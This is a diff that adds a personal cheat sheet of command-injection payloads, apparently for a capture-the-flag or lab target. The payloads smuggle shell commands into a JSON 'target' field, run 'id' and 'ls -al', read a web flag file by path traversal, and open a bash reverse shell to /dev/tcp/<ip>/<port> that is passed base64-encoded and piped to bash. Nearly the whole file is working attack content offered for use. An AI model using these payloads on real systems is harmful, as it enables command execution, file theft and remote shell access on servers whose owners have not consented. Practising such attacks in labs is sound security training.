@@ -1,0 +1,18 @@
+Injection-Command
+
+#Command Injection
+
+{"target":"\" ;id\n"}
+{"target":"\" ;/usr/bin/id\n"}
+{"target":"\" \n/usr/bin/id\n"}
+{"target":"\" \n/bin/ls -al\n"}
+
+ 
+
+#Web Flag
+{"target":"\" \ncat ../../../web-flag.txt\n"}
+
+#Reverse Shell that I use (Convert to base64)
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+
+{"target":"\" \necho <base64> | base64 -d | bash\n"}
